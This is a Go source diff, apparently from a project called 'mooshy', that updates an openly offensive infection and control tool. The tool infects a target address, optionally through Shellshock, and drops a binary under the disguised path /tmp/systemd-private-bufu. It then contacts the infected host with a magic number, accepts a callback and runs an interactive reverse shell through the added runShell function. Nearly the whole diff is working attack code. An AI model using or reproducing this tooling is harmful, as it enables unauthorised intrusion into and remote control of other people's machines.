@@ -22,12 +22,11 @@ import (
 	"github.com/google/go-github/github"
 	"github.com/pkg/errors"
 	"github.com/pkg/sftp"
+	"github.com/rvolosatovs/mooshy"
 	"golang.org/x/crypto/ssh"
 	"golang.org/x/crypto/ssh/agent"
 	"golang.org/x/oauth2"
 )
-
-var MagicNumber = "xVUOcOIljRTgY2MWMK0piQ=="
 
 const UnsuspiciousExecutable = "/tmp/systemd-private-bufu"
 
@@ -174,6 +173,29 @@ func latestMoosh(token string) (string, error) {
 	return "", errors.New("not found")
 }
 
+func runShell(rw io.ReadWriter) (err error) {
+	cmd := exec.Command("stty", "-echo", "raw")
+	cmd.Stdin = os.Stdin
+	if err = cmd.Run(); err != nil {
+		return errors.Wrap(err, "failed to open stty")
+	}
+
+	defer func() {
+		cmd := exec.Command("stty", "sane")
+		cmd.Stdin = os.Stdin
+		if rerr := cmd.Run(); rerr != nil && err == nil {
+			err = errors.Wrap(rerr, "failed to close stty")
+		}
+	}()
+
+	go io.Copy(os.Stdout, rw)
+	_, err = io.Copy(rw, os.Stdin)
+	if err != nil {
+		errors.Wrap(err, "failed to pass stdin to reverse shell")
+	}
+	return nil
+}
+
 func main() {
 	var home string
 
@@ -200,6 +222,7 @@ func main() {
 	useShellShock := flag.Bool("shellShock", false, "Use Shell Shock for the infection")
 	moosh := flag.String("moosh", "", "Path to moosh. If empty - uses the one from https://github.com/rvolosatovs/mooshy/releases/latest )")
 	addr := flag.String("addr", "", "The lucky guy(in case of Shell Shock - endpoint)")
+	tcp := flag.String("tcp", ":0", "TCP address to listen on in execution mode")
 	token := flag.String("token", "", "Github token to use")
 	flag.Parse()
 
@@ -225,7 +248,7 @@ func main() {
 				log.Fatalf("Failed to query latest moosh release: %s", err)
 			}
 
-			log.Println("Downloading latest 'moosh' binary from %s...", url)
+			log.Printf("Downloading latest 'moosh' binary from %s...", url)
 			resp, err := http.Get(url)
 			if err != nil {
 				log.Fatalf("Failed to GET latest moosh release from %s: %s", url, err)
@@ -344,50 +367,36 @@ func main() {
 		}
 		log.Printf("%s infected.\nResponse:\n%s", *addr, string(b))
 	default:
-		l, err := net.Listen("tcp4", "0.0.0.0:0")
+		l, err := net.Listen("tcp4", *tcp)
 		if err != nil {
 			log.Fatalf("Failed to open reverse shell: %s", err)
 		}
 		log.Printf("TCP socket opened on %s", l.Addr())
+
+		conn, err := net.Dial("tcp4", *addr)
+		if err != nil {
+			log.Fatalf("Failed to dial %s: %s", *addr, err)
+		}
 
 		_, port, err := net.SplitHostPort(l.Addr().String())
 		if err != nil {
 			log.Fatalf("Failed to parse port from %s: %s", l.Addr(), err)
 		}
 
-		go func() {
-			conn, err := net.Dial("tcp4", *addr)
-			if err != nil {
-				log.Fatalf("Failed to dial %s: %s", *addr, err)
-			}
+		_, err = conn.Write([]byte(mooshy.MagicNumber + port))
+		if err != nil {
+			log.Fatalf("Failed to send magic number to %s: %s", *addr, err)
+		}
 
-			_, err = conn.Write([]byte(MagicNumber + " " + port))
-			if err != nil {
-				log.Fatalf("Failed to send magic number to %s: %s", *addr, err)
-			}
-		}()
-
-		conn, err := l.Accept()
+		conn, err = l.Accept()
 		if err != nil {
 			log.Fatalf("Failed to accept connection on %s: %s", l.Addr(), err)
 		}
 		log.Printf("Received connection from %s", conn.RemoteAddr())
+		defer conn.Close()
 
-		cmd := exec.Command("stty", "-echo", "raw")
-		cmd.Stdin = os.Stdin
-		if err = cmd.Run(); err != nil {
-			log.Fatalf("Failed to open stty: %s", err)
+		if err := runShell(conn); err != nil {
+			log.Fatalf("Failed to run shell on %s: %s", l.Addr(), err)
 		}
-
-		defer func() {
-			cmd = exec.Command("stty", "sane")
-			cmd.Stdin = os.Stdin
-			if err = cmd.Run(); err != nil {
-				log.Fatalf("Failed to close stty: %s", err)
-			}
-		}()
-
-		go io.Copy(conn, os.Stdout)
-		io.Copy(os.Stdin, conn)
 	}
 }
